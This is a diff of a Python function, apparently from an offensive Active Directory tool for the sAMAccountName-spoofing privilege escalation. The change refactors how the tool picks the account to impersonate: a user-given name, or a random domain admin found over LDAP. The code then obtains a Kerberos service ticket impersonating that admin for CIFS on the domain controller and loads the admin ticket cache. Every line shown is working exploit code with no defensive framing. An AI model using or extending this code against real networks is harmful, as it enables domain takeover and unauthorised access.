@@ -50,14 +50,12 @@ def samtheadmin(username, password, domain, options):
     logging.info(f'Selected Target {dcfull}')
 
     if options.impersonate:
-        logging.info('test')
+        target_user = options.impersonate
     else:
         domainAdmins = get_domain_admins(ldap_session, domain_dumper)
-        random_domain_admin = random.choice(domainAdmins)
-        logging.info(random_domain_admin)
+        target_user = random.choice(domainAdmins)
 
-    logging.info(f'Total Domain Admins {len(domainAdmins)}')
-    logging.info(f'will try to impersonate {random_domain_admin}')
+    logging.info(f'Attempting to impersonate {target_user}')
 
     # udata = get_user_info(username, ldap_session, domain_dumper)
     if MachineAccountQuota < 0:
@@ -116,12 +114,12 @@ def samtheadmin(username, password, domain, options):
 
     os.environ["KRB5CCNAME"] = dcticket
     executer = GETST(None, None, domain, options,
-        impersonate_target=random_domain_admin,
+        impersonate_target=target_user,
         target_spn=f"cifs/{dcfull}")
     executer.run()
 
 
-    adminticket = str(random_domain_admin + '.ccache')
+    adminticket = str(target_user + '.ccache')
     os.environ["KRB5CCNAME"] = adminticket
 
     # will do something else later on 
